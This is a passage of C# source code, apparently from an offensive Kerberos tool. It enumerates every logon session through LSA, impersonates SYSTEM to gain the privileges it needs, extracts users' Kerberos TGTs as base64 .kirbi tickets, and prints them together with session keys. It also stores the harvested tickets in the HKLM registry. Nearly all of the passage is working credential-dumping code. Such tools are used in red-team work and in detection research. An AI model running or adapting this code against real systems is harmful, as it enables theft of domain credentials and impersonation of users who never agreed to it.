                string serverRealm = Marshal.PtrToStringUni(ticket.ServerRealm.Buffer, ticket.ServerRealm.Length / 2);
                string clientName = Marshal.PtrToStringUni(ticket.ClientName.Buffer, ticket.ClientName.Length / 2);
                string clientRealm = Marshal.PtrToStringUni(ticket.ClientRealm.Buffer, ticket.ClientRealm.Length / 2);

                Console.WriteLine("    [{0:x}] - 0x{1:x} - {2}", i, (int)ticket.EncryptionType, (Interop.KERB_ETYPE)ticket.EncryptionType);
                Console.WriteLine("      Start/End/MaxRenew: {0} ; {1} ; {2}", startTime, endTime, renewTime);
                Console.WriteLine("      Server Name       : {0} @ {1}", serverName, serverRealm);
                Console.WriteLine("      Client Name       : {0} @ {1}", clientName, clientRealm);
                Console.WriteLine("      Flags             : {0} ({1:x})", ticketFlags, ticket.TicketFlags);
                Console.WriteLine();
            }

            // clean up
            Interop.LsaFreeReturnBuffer(ticketsPointer);
            Marshal.FreeHGlobal(cacheQueryPtr);

            // disconnect from LSA
            Interop.LsaDeregisterLogonProcess(lsaHandle);
        }

        public static void TriageKerberosTickets(Interop.LUID targetLuid, string user = "", string service = "")
        {
            if (Helpers.IsHighIntegrity())
            {
                TriageKerberosTicketsAllUsers(targetLuid, user, service);
            }
            else
            {
                TriageKerberosTicketsCurrentUser(service);
            }
        }

        public static void TriageKerberosTicketsAllUsers(Interop.LUID targetLuid, string user = "", string service = "")
        {
            // quickly triage Kerberos tickets in a table for all users on the system (assuming elevation)

            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
            //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheExMessage message type to enumerate all cached tickets

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            Console.WriteLine("\r\n\r\n[*] Action: Triage Kerberos Tickets (All Users)\r\n");

            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
                return;
            }

            if ((ulong)targetLuid != 0)
            {
                Console.WriteLine("[*] Target LUID     : 0x{0:x}", (ulong)targetLuid);
            }
            if (!String.IsNullOrEmpty(user))
            {
                Console.WriteLine("[*] Target user     : {0}", user);
            }
            if (!String.IsNullOrEmpty(service))
            {
                Console.WriteLine("[*] Target service  : {0}", service);
            }
            if (((ulong)targetLuid != 0) || (!String.IsNullOrEmpty(user)) || (!String.IsNullOrEmpty(service)))
            {
                Console.WriteLine();
            }

            var table = new ConsoleTable("LUID", "UserName", "Service", "EndTime");
            int retCode;
            int authPack;
            string name = "kerberos";
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            IntPtr lsaHandle = LsaRegisterLogonProcessHelper();

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (lsaHandle == IntPtr.Zero)
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                if (currentName == "NT AUTHORITY\\SYSTEM")
                {
                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                    lsaHandle = LsaRegisterLogonProcessHelper();
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    Helpers.GetSystem();
                    // should now have the proper privileges to get a Handle to LSA
                    lsaHandle = LsaRegisterLogonProcessHelper();
                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                    Interop.RevertToSelf();
                }
            }

            try
            {
                // obtains the unique identifier for the kerberos authentication package.
                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // first return all the logon sessions
                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++)
                {
                    IntPtr sessionData;
                    ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionData);
                    Interop.SECURITY_LOGON_SESSION_DATA data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero)
                    {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
                        Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();

                        IntPtr ticketsPointer = IntPtr.Zero;
                        DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);

                        int returnBufferLength = 0;
                        int protocalStatus = 0;

                        Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
                        Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                        Interop.KERB_TICKET_CACHE_INFO_EX ticket;

                        // input object for querying the ticket cache for a specific logon ID
                        Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
                        tQuery.LogonId = userLogonID;

                        if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
                        {
                            tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;

                            // query LSA, specifying we want the ticket cache
                            IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tQuery));
                            Marshal.StructureToPtr(tQuery, tQueryPtr, false);
                            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);

                            if (ticketsPointer != IntPtr.Zero)
                            {
                                // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                                tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                                int count2 = tickets.CountOfTickets;

                                if (count2 != 0)
                                {
                                    // get the size of the structures we're iterating over
                                    Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

                                    for (int j = 0; j < count2; j++)
                                    {
                                        // iterate through the result structures
                                        IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));

                                        // parse the new ptr to the appropriate structure
                                        ticket = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

                                        DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
                                        DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
                                        DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);

                                        string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();

                                        // extract the server name/realm and client name/realm
                                        string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
                                        string serverRealm = Marshal.PtrToStringUni(ticket.ServerRealm.Buffer, ticket.ServerRealm.Length / 2);
                                        string clientName = Marshal.PtrToStringUni(ticket.ClientName.Buffer, ticket.ClientName.Length / 2);
                                        string clientRealm = Marshal.PtrToStringUni(ticket.ClientRealm.Buffer, ticket.ClientRealm.Length / 2);

                                        if (String.IsNullOrEmpty(user) || (Regex.IsMatch(clientName, user, RegexOptions.IgnoreCase)))
                                        {
                                            if (String.IsNullOrEmpty(service) || (Regex.IsMatch(serverName, service, RegexOptions.IgnoreCase)))
                                            {
                                                table.AddRow(data.LoginID.ToString(), String.Format("{0} @ {1}", clientName, clientRealm), serverName, endTime.ToString());
                                            }
                                        }
                                    }
                                }
                            }

                            // cleanup
                            Interop.LsaFreeReturnBuffer(ticketsPointer);
                            Marshal.FreeHGlobal(tQueryPtr);
                        }
                    }

                    // move the pointer forward
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));

                    // cleaup
                    Interop.LsaFreeReturnBuffer(sessionData);
                }
                Interop.LsaFreeReturnBuffer(luidPtr);

                // disconnect from LSA
                Interop.LsaDeregisterLogonProcess(lsaHandle);

                // write out the table
                table.Write();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex);
            }
        }

        public static void TriageKerberosTicketsCurrentUser(string service = "")
        {
            // quickly triage Kerberos tickets in a table for the current user

            //  first uses LsaConnectUntrusted to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheExMessage message type
            //  to enumerate all cached tickets

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            Console.WriteLine("\r\n\r\n[*] Action: Triage Kerberos Tickets (Current User)\r\n");

            Interop.LUID currentLUID = GetCurrentLUID();
            Console.WriteLine("[*] Current LUID    : {0}", currentLUID);

            if (!String.IsNullOrEmpty(service))
            {
                Console.WriteLine("[*] Target service  : {0}", service);
            }
            Console.WriteLine();

            var table = new ConsoleTable("LUID", "UserName", "Service", "EndTime");
            string name = "kerberos";
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            IntPtr ticketsPointer = IntPtr.Zero;
            int authPack;
            int returnBufferLength = 0;
            int protocalStatus = 0;
            IntPtr lsaHandle;
            int retCode;

            // If we want to look at tickets from a session other than our own
            //      then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
            retCode = Interop.LsaConnectUntrusted(out lsaHandle);

            // obtains the unique identifier for the kerberos authentication package.
            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

            Interop.KERB_QUERY_TKT_CACHE_REQUEST cacheQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
            Interop.KERB_QUERY_TKT_CACHE_RESPONSE cacheTickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
            Interop.KERB_TICKET_CACHE_INFO_EX ticket;

            // input object for querying the ticket cache (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request)
            cacheQuery.LogonId = new Interop.LUID();
            cacheQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;

            // query LSA, specifying we want the ticket cache
            IntPtr cacheQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheQuery));
            Marshal.StructureToPtr(cacheQuery, cacheQueryPtr, false);
            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, cacheQueryPtr, Marshal.SizeOf(cacheQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);

            // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
            cacheTickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
            int count = cacheTickets.CountOfTickets;

            // get the size of the structures we're iterating over
            Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

            for (int i = 0; i < count; i++)
            {
                // iterate through the result structures
                IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + i * dataSize)));

                // parse the new ptr to the appropriate structure
                ticket = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

                DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
                DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
                DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);

                string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();

                // extract the server name/realm and client name/realm
                string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
                string serverRealm = Marshal.PtrToStringUni(ticket.ServerRealm.Buffer, ticket.ServerRealm.Length / 2);
                string clientName = Marshal.PtrToStringUni(ticket.ClientName.Buffer, ticket.ClientName.Length / 2);
                string clientRealm = Marshal.PtrToStringUni(ticket.ClientRealm.Buffer, ticket.ClientRealm.Length / 2);

                if (String.IsNullOrEmpty(service) || (Regex.IsMatch(serverName, service, RegexOptions.IgnoreCase)))
                {
                    table.AddRow(currentLUID.ToString(), String.Format("{0} @ {1}", clientName, clientRealm), serverName, endTime.ToString());
                }
            }

            // clean up
            Interop.LsaFreeReturnBuffer(ticketsPointer);
            Marshal.FreeHGlobal(cacheQueryPtr);

            // disconnect from LSA
            Interop.LsaDeregisterLogonProcess(lsaHandle);

            // write out the table
            table.Write();
        }

        public static List<KRB_CRED> ExtractTGTs(Interop.LUID targetLuid, bool includeComputerAccounts = false)
        {
            // extracts Kerberos TGTs for all users on the system (assuming elevation) or for a specific logon ID (luid)

            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
            //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets
            //  and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
            //  to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            int retCode;
            int authPack;
            string name = "kerberos";
            string targetService = "krbtgt";
            //List<KRB_CRED> creds = new List<KRB_CRED>();
            Dictionary<String, KRB_CRED> creds = new Dictionary<String, KRB_CRED>();
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            IntPtr lsaHandle = LsaRegisterLogonProcessHelper();

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (lsaHandle == IntPtr.Zero)
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                if (currentName == "NT AUTHORITY\\SYSTEM")
                {
                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                    lsaHandle = LsaRegisterLogonProcessHelper();
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    Helpers.GetSystem();
                    // should now have the proper privileges to get a Handle to LSA
                    lsaHandle = LsaRegisterLogonProcessHelper();
                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                    Interop.RevertToSelf();
                }
            }

            try
            {
                // obtains the unique identifier for the kerberos authentication package.
                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // first return all the logon sessions
                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++)
                {
                    IntPtr sessionData;
                    ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionData);
                    Interop.SECURITY_LOGON_SESSION_DATA data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero)
                    {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();

                        // exclude computer accounts unless instructed otherwise
                        if (includeComputerAccounts || !Regex.IsMatch(username, ".*\\$$"))
                        {

                            System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
                            string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
                            string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
                            Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
                            DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                            string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
                            string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
                            string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();

                            IntPtr ticketsPointer = IntPtr.Zero;
                            DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);

                            int returnBufferLength = 0;
                            int protocalStatus = 0;

                            Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
                            Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                            Interop.KERB_TICKET_CACHE_INFO ticket;

                            // input object for querying the ticket cache for a specific logon ID
                            Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
                            tQuery.LogonId = userLogonID;

                            if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
                            {
                                tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

                                // query LSA, specifying we want the ticket cache
                                IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tQuery));
                                Marshal.StructureToPtr(tQuery, tQueryPtr, false);
                                retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);

                                if (ticketsPointer != IntPtr.Zero)
                                {
                                    // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                                    tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                                    int count2 = tickets.CountOfTickets;

                                    if (count2 != 0)
                                    {
                                        // get the size of the structures we're iterating over
                                        Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO));

                                        for (int j = 0; j < count2; j++)
                                        {
                                            // iterate through the result structures
                                            IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));

                                            // parse the new ptr to the appropriate structure
                                            ticket = (Interop.KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO));

                                            // extract the serverName and ticket flags
                                            string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);

                                            if (String.IsNullOrEmpty(targetService) || (Regex.IsMatch(serverName, String.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase)))
                                            {
                                                // now we have to call LsaCallAuthenticationPackage() again with the specific server target
                                                IntPtr responsePointer = IntPtr.Zero;
                                                Interop.KERB_RETRIEVE_TKT_REQUEST request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
                                                Interop.KERB_RETRIEVE_TKT_RESPONSE response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();

                                                // signal that we want encoded .kirbi's returned
                                                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;

                                                // the specific logon session ID
                                                request.LogonId = userLogonID;

                                                request.TicketFlags = ticket.TicketFlags;
                                                request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
                                                request.EncryptionType = 0x0;
                                                // the target ticket name we want the ticket for
                                                Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(serverName);
                                                request.TargetName = tName;

                                                // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
                                                //      for KerbRetrieveEncodedTicketMessages

                                                // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
                                                int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
                                                int newStructSize = structSize + tName.MaximumLength;
                                                IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

                                                // marshal the struct from a managed object to an unmanaged block of memory.
                                                Marshal.StructureToPtr(request, unmanagedAddr, false);

                                                // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
                                                IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

                                                // copy unicode chars to the new location
                                                Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

                                                // update the target name buffer ptr            
                                                Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size==8?24:16, newTargetNameBuffPtr);

                                                // actually get the data
                                                retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

                                                // translate the LSA error (if any) to a Windows error
                                                uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

                                                if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))
                                                {
                                                    // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                                                    response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                                                    Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                                                    // extract the ticket, build a KRB_CRED object, and add to the cache
                                                    byte[] encodedTicket = new byte[encodedTicketSize];
                                                    Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);

                                                    KRB_CRED ticketKirbi = new KRB_CRED(encodedTicket);

                                                    // uniquify initial creds by user@domain.com
                                                    string userName = ticketKirbi.enc_part.ticket_info[0].pname.name_string[0];
                                                    string domainName = ticketKirbi.enc_part.ticket_info[0].prealm;
                                                    string userDomain = String.Format("{0}@{1}", userName, domainName);
                                                    
                                                    if (creds.ContainsKey(userDomain))
                                                    {
                                                        // only take the ticket with the latest renew_till
                                                        if(DateTime.Compare(ticketKirbi.enc_part.ticket_info[0].renew_till, creds[userDomain].enc_part.ticket_info[0].renew_till) > 0)
                                                        {
                                                            creds[userDomain] = ticketKirbi;
                                                        }
                                                    }
                                                    else
                                                    {
                                                        creds[userDomain] = ticketKirbi;
                                                    }
                                                }
                                                else
                                                {
                                                    string errorMessage = new Win32Exception((int)winError).Message;
                                                    Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, serverName, errorMessage);
                                                }

                                                // clean up
                                                Interop.LsaFreeReturnBuffer(responsePointer);
                                                Marshal.FreeHGlobal(unmanagedAddr);
                                            }
                                        }
                                    }
                                }

                                // cleanup
                                Interop.LsaFreeReturnBuffer(ticketsPointer);
                                Marshal.FreeHGlobal(tQueryPtr);
                            }
                        }
                    }

                    // move the pointer forward
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));

                    // cleaup
                    Interop.LsaFreeReturnBuffer(sessionData);
                }
                Interop.LsaFreeReturnBuffer(luidPtr);

                // disconnect from LSA
                Interop.LsaDeregisterLogonProcess(lsaHandle);

                return new List<KRB_CRED>(creds.Values);
                //return creds.Values;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex);
                return null;
            }
        }

        public static void DisplayTGTs(List<KRB_CRED> creds)
        {
            foreach(KRB_CRED cred in creds)
            {
                string userName = cred.enc_part.ticket_info[0].pname.name_string[0];
                string domainName = cred.enc_part.ticket_info[0].prealm;
                DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);
                DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
                DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
                Interop.TicketFlags flags = cred.enc_part.ticket_info[0].flags;
                string base64TGT = Convert.ToBase64String(cred.Encode().Encode());

                Console.WriteLine("User                  :  {0}@{1}", userName, domainName);
                Console.WriteLine("StartTime             :  {0}", startTime);
                Console.WriteLine("EndTime               :  {0}", endTime);
                Console.WriteLine("RenewTill             :  {0}", renewTill);
                Console.WriteLine("Flags                 :  {0}", flags);
                Console.WriteLine("Base64EncodedTicket   :\r\n");
                foreach (string line in Helpers.Split(base64TGT, 100))
                {
                    Console.WriteLine("    {0}", line);
                }
                Console.WriteLine("\r\n");
            }
        }

        public static void SaveTicketsToRegistry(List<KRB_CRED> creds, string baseRegistryKey)
        {
            string user = null;
            RegistryKey basePath = null;
            if (Environment.UserName == "SYSTEM")
            {
                user = "NT AUTHORITY\\SYSTEM";
            }
            else
            {
                user = Environment.UserDomainName + "\\" + Environment.UserName;
            };
            try
            {
                Registry.LocalMachine.CreateSubKey(baseRegistryKey);
                basePath = Registry.LocalMachine.OpenSubKey(baseRegistryKey, RegistryKeyPermissionCheck.ReadWriteSubTree);
                RegistrySecurity rs = basePath.GetAccessControl();
                RegistryAccessRule rar = new RegistryAccessRule(
                    user,
                    RegistryRights.FullControl,
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                    PropagationFlags.None,
                    AccessControlType.Allow);
                rs.AddAccessRule(rar);
                basePath.SetAccessControl(rs);
            }
            catch
            {
                Console.WriteLine("[-] Error setting correct ACLs for HKLM:\\{0}", baseRegistryKey);
                basePath = null;
            }
            if (basePath != null)
            {
                foreach (KRB_CRED cred in creds)
                {
                    string userName = cred.enc_part.ticket_info[0].pname.name_string[0];
                    string domainName = cred.enc_part.ticket_info[0].prealm;
                    DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);
                    DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
                    DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
                    Interop.TicketFlags flags = cred.enc_part.ticket_info[0].flags;
                    string base64TGT = Convert.ToBase64String(cred.Encode().Encode());

                    Microsoft.Win32.RegistryKey userData = basePath.CreateSubKey(userName + "@" + domainName);

                    // Create the keys underneath this
                    userData.SetValue("Username", domainName + "\\" + userName);
                    userData.SetValue("StartTime", startTime);
                    userData.SetValue("EndTime", endTime);
                    userData.SetValue("RenewTill", renewTill);
                    userData.SetValue("Flags", flags);
                    userData.SetValue("Base64EncodedTicket", base64TGT);
                }
                Console.WriteLine("\r\n[*] Wrote {0} tickets to HKLM:\\{1}.", creds.Count, baseRegistryKey);
            }
        }

        public static void DisplayTicket(KRB_CRED cred, bool extractKerberoastHash = false)
        {
            Console.WriteLine("\r\n[*] Action: Describe Ticket\r\n");

            string userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
            string domainName = cred.enc_part.ticket_info[0].prealm;
            string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
            string srealm = cred.enc_part.ticket_info[0].srealm;
            string keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.enc_part.ticket_info[0].key.keytype);
            string b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);
            DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);
            DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
            DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
            Interop.TicketFlags flags = cred.enc_part.ticket_info[0].flags;

            Console.WriteLine("  UserName              :  {0}", userName);
            Console.WriteLine("  UserRealm             :  {0}", domainName);
            Console.WriteLine("  ServiceName           :  {0}", sname);
            Console.WriteLine("  ServiceRealm          :  {0}", srealm);
            Console.WriteLine("  StartTime             :  {0}", startTime);
            Console.WriteLine("  EndTime               :  {0}", endTime);
            Console.WriteLine("  RenewTill             :  {0}", renewTill);
            Console.WriteLine("  Flags                 :  {0}", flags);
